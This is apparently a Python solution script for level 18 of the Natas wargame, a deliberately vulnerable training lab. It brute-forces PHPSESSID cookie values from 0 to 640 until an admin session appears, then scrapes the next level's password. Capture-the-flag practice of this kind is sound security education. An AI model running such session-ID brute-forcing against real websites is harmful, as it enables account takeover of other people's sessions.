import re
from src.natas.base_level import NatasLevel

class Level_18(NatasLevel):

  num = 18
  explanation = "On this level, we brute-force the PHPSESSID\n     from 1 to 640 until the response contains 'You are an admin'."

  def exploit(self) -> str:

    match = ""

    for i in range(641):
      resp  = self.session.get(self.base_url + "/index.php", headers = {'Cookie': f"PHPSESSID={i}"})
      if re.search(r'You are an admin', resp.text) != None:
        resp_pass = self.session.get(self.base_url + "/index.php", headers = {'Cookie': f"PHPSESSID={i}"})
        match     = re.search(r'(?<=Password: )[A-Za-z0-9]+', resp_pass.text, re.MULTILINE).group().strip()
        break

    return match
